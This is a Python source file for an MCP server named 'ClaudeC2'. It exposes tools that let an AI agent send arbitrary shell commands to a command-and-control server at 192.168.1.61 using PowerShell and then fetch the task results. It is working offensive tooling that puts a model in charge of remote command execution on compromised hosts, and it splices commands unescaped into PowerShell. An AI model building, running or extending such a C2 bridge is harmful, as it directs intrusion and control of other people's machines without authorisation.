from subprocess import check_output, CalledProcessError
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("ClaudeC2")

@mcp.tool(name="create_c2_task", description="Send task to C2 using PowerShell")
def create_task(command: str) -> dict:
    try:
        ps_command = (
            f"$body = @{{ command = 'shell {command}' }} | ConvertTo-Json;"
            f"Invoke-RestMethod -Uri 'http://192.168.1.61:8000/create_task' -Method POST -Body $body -ContentType 'application/json'"
        )
        output = check_output(["powershell", "-Command", ps_command], text=True)
        return {"status": "created", "response": output.strip()}
    except CalledProcessError as e:
        return {"status": "error", "message": str(e)}




@mcp.tool(name="check_c2_task", description="Check task status from C2 using PowerShell")
def check_task(task_id: int) -> dict:
    try:
        ps_command = (
            f"$res = Invoke-RestMethod -Uri 'http://192.168.1.61:8000/get_tasks_status';"
            f"$task = $res.tasks | Where-Object {{ $_.id -eq {task_id} }};"
            f"If ($task) {{ $task | ConvertTo-Json -Compress }} Else {{ 'NotFound' }}"
        )
        output = check_output(["powershell", "-Command", ps_command], text=True)
        if "NotFound" in output:
            return {"status": "not_found"}
        return {"status": "completed", "result": output.strip()}
    except CalledProcessError as e:
        return {"status": "error", "message": str(e)}
